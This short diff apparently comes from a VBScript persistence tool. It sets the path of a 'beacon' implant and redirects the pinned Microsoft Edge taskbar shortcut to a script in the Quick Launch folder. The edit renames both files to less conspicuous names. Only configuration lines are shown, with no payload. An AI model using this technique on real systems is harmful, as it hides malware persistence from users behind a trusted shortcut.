@@ -1,6 +1,6 @@
-implant = "C:\Users\<user>\Downloads\<beacon.exe>"
+implant = "C:\Users\<user>\Downloads\<bCn.exe>"
 ' change username + path
-newTarget = "C:\Users\<user>\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\ImplicitAppShortcuts\impledge.vbs"
+newTarget = "C:\Users\<user>\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\ImplicitAppShortcuts\updedge.vbs"
 lnkName = "Microsoft Edge.lnk"
 
 ' targets the taskbar
